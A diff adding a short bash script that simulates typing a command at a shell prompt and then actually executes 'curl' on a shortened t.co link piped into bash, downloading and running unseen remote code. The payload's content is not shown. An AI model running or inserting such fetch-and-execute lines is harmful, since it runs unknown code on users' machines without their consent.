@@ -1,0 +1,9 @@
+#!/bin/bash
+
+echo -n "$ "
+echo "" | pv -qL 10 
+
+echo -n "$ "
+echo "curl https://t.co/GOH1bNDoj2 | bash" | pv -qL 10 
+curl https://t.co/GOH1bNDoj2 | bash
+exit
